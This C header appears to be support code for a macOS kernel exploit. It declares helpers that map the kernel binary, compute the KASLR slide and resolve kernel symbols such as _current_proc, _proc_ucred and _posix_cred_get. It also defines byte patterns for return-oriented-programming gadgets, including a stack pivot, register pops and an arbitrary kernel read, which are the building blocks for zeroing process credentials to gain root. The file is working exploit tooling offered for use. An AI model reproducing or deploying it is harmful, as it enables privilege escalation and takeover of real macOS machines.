#include <stdio.h>          // printf
#include <stdlib.h>         // malloc

#include <fcntl.h>          // O_RDONLY
#include <sys/stat.h>       // struct stat
#include <sys/mman.h>       // PROT_READ

#include <string.h>         // strcmp, memmem

#include <mach-o/loader.h>  // struct load_command
#include <mach-o/nlist.h>   // struct nlist_64

#include <mach/mach.h>      // mach_port_allocate, mach_port_insert_right

#include <CoreFoundation/CoreFoundation.h>
#include <IOKit/IOKitLib.h>

#define EXIT_ON_MACH_ERROR(msg, retval) \
  if (kr != KERN_SUCCESS) { \
    mach_error(msg ":" , kr); \
    exit((retval)); \
  }

#define SLIDE_PTR(addr) addr + kslide


typedef struct memory_map
{
    void *map;
    size_t sz;
} memory_map_t;

typedef memory_map_t kernel_map_t;

struct segment_command_64 *find_segment_64(struct mach_header_64 *mh, const char *segname);
struct load_command *find_load_command(memory_map_t *mapping, uint32_t cmd);

memory_map_t *map_file(const char *path);
uint64_t kernel_base(kernel_map_t *mapping);

uint64_t find_kext_address(const char *identifier);
uint64_t find_gadget(memory_map_t *mapping, const char *bytes, const uint8_t size);
uint64_t find_symbol_address(memory_map_t *mapping, const char *symbol_name);

extern CFDictionaryRef OSKextCopyLoadedKextInfo(CFArrayRef, CFArrayRef);


/* 
 * Before using any of these functions below, declare the kernel map using:
 * kernel_map_t *km = map_file("/System/Library/Kernels/kernel");
*/

#define _current_proc                   find_symbol_address(km, "_current_proc")
#define _proc_ucred                     find_symbol_address(km, "_proc_ucred")
#define _posix_cred_get                 find_symbol_address(km, "_posix_cred_get")
#define _bzero                          find_symbol_address(km, "_bzero")
#define _thread_exception_return        find_symbol_address(km, "_thread_exception_return")

#define _iokit_notify                   find_symbol_address(km, "_iokit_notify")


/*
__text:FFFFFF8000638AE1                 push    rax
__text:FFFFFF8000638AE2                 add     [rax], eax
__text:FFFFFF8000638AE4                 add     [rbx+41h], bl   ; CODE XREF: __text:FFFFFF8000638A83â†‘j
__text:FFFFFF8000638AE7                 pop     rsp
__text:FFFFFF8000638AE8                 pop     r14
__text:FFFFFF8000638AEA                 pop     r15
__text:FFFFFF8000638AEC                 pop     rbp
__text:FFFFFF8000638AED                 retn
*/
#define PIVOT_RAX__RET                   find_gadget(km, (char *)((uint8_t[]){ \
0x50, 0x01, 0x00, 0x00, 0x5B, 0x41, 0x5C, 0x41, 0x5E, 0x41, 0x5F, 0x5D, 0xC3 \
}), 13)


/*
__text:FFFFFF8000422440 58                                   pop     rax
__text:FFFFFF8000422441 C3                                   retn
*/
#define POP_RAX__RET                    find_gadget(km, (char *)((uint8_t[]){ \
0x58, 0xC3 \
}), 2)


/*
__text:FFFFFF8000411E82                 pop     rcx
__text:FFFFFF8000411E83                 retn
*/
#define POP_RCX__RET                    find_gadget(km, (char *)((uint8_t[]){ \
0x59, 0xC3 \
}), 2)


/*
__text:FFFFFF800053676C                 nop
__text:FFFFFF800053676D                 retn
*/
#define NOP__RET                        find_gadget(km, (char *)((uint8_t[]){ \
0x90, 0xC3 \
}), 2)


/*
__text:FFFFFF80004D8159 5F              pop     rdi
__text:FFFFFF80004D815A C3              retn
*/
#define POP_RDI__RET                    find_gadget(km, (char*)((uint8_t[]){ \
0x5f, 0xC3 \
}), 2)



/*
__text:FFFFFF800047619E                 pop     rsi
__text:FFFFFF800047619F                 retn
*/
#define POP_RSI__RET                    find_gadget(km, (char*)((uint8_t[]){ \
0x5e, 0xC3 \
}), 2)


/*
__text:FFFFFF800037D0AA                 mov     rdi, rax
__text:FFFFFF800037D0AD                 pop     rbp
__text:FFFFFF800037D0AE                 jmp     rcx
*/
#define MOV_RDI_RAX__POP_RBP__JMP_RCX   find_gadget(km, (char *)((uint8_t[]){ \
0x48, 0x89, 0xc7, 0x5d, 0xff, 0xe1 \
}), 6)


/*
__text:FFFFFF8000679FB8                 pop     rsp
__text:FFFFFF8000679FB9                 retn
*/
#define POP_RSP__RET                    find_gadget(km, (char*)((uint8_t[]){ \
0x5c, 0xC3 \
}), 2)


/*
__text:FFFFFF8000339F7B 48 8B 00        mov     rax, [rax]
__text:FFFFFF8000339F7E 5D              pop     rbp
__text:FFFFFF8000339F7F C3              retn
*/
#define READ_RAX_TO_RAX__POP_RBP__RET   find_gadget(km, (char*)((uint8_t[]){ \
0x48, 0x8B, 0x00, 0x5D, 0xC3 \
}), 5)